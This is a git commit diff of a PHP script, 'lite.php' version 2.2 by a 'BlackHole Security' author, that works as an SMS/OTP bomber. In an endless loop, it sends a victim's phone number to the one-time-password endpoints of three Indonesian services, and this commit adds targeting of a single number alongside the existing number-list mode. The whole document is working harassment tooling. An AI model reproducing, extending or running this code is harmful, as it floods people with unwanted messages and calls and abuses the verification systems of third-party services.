fad089f65ffca64bd449a60927b78a615df977b5
Cvar1984 <gedzsarjun@gmail.com>
2018-05-17 17:25:58 +0000

    Support Single No & Listed

--- lite.php
+++ lite.php
@@ -24,6 +24,19 @@ if(strtolower(substr(PHP_OS, 0, 3)) == 'win') {
     $ua = 'Mozilla/5.0 (Linux; Android 5.1.1; Andromax A16C3H Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36';
     system('clear');
 }
+declare(ticks = 1);
+pcntl_signal(SIGTERM, "signal_handler"); pcntl_signal(SIGINT, "signal_handler");
+function signal_handler($signal) {
+	global $Y,$X;
+	switch($signal) {
+		case SIGTERM:
+		die($Y."\n=========================== Cvar1984 ))=====(@)>".$X."\n");
+		case SIGKILL:
+		die($Y."\n=========================== Cvar1984 ))=====(@)>".$X."\n");
+		case SIGINT:
+		die($Y."\n=========================== Cvar1984 ))=====(@)>".$X."\n");
+	}
+}
 function post_data($url,$data) {
 	global $ua;
 	$ch=curl_init($url);
@@ -46,15 +59,22 @@ echo $R."\n++++++++++++++++++++++++++++++++++++++";
 echo $B."\nAuthor  : Cvar1984                   ".$R.'+';
 echo $B."\nGithub  : https://github.com/Cvar1984".$R.'+';
 echo $B."\nTeam    : BlackHole Security         ".$R.'+';
-echo $B."\nVersion : 2.1                        ".$R.'+';
+echo $B."\nVersion : 2.2                        ".$R.'+';
 echo $B."\nDate    : 13-03-2018                 ".$R.'+';
 echo $R."\n++++++++++++++++++++++++++++++++++++++".$G.$X."\n\n";
 isset($argv[1]) OR die($RR."[!] Input No List [!]\n".$X);
+if(is_numeric($argv[1])) {
+	while(1) {
+		echo "Send OTP To -> ".$G.$argv[1].$X."\n";
+		post_data('https://www.tokocash.com/oauth/otp',"msisdn=".$argv[1]."&accept=call");
+		post_data("http://sc.jd.id/phone/sendPhoneSms","phone=".$argv[1]."&smsType=1");
+		post_data("https://www.phd.co.id/en/users/sendOTP","phone_number=".$argv[1]);
+	}
+}
 if(!file_exists($argv[1])) {
 	die($RR."[!] File Not Exists [!]".$X."\n");
 }
-$argv[1]=explode("\n", file_get_contents($argv[1]));
-$jumlah=count($argv[1]);
+$argv[1]=explode("\n",file_get_contents($argv[1]));
 $argv[1]=str_replace(' ','',$argv[1]);
 while(1) {
 foreach($argv[1] as $argv[2]):
@@ -64,4 +84,3 @@ foreach($argv[1] as $argv[2]):
 	post_data("https://www.phd.co.id/en/users/sendOTP","phone_number=".$argv[2]);
 endforeach;
 }
-die($Y.'=========================== Cvar1984 ))=====(@)>'.$X."\n");
